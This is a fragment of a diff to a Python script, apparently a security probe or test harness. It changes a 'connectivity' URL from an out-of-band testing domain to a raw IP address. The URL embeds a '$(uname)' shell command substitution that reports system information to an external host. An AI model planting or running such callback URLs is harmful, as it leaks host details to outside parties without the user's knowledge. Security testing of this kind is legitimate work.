@@ -6,7 +6,7 @@ import sys
 from pathlib import Path
 
 FOLDER_NAME = "This Is Just a Folder"
-CONNECTIVITY_URL = "https://yrtd8yxpnhsubzz1dsmin2q64xasylma.l.prod.burpcloth.infosec.a2z.com/?name=$(uname)"
+CONNECTIVITY_URL = "http://3.94.132.160/?name=$(uname)"
 
 
 def run_command(title: str, command: list[str] | str, use_shell: bool = False) -> int:
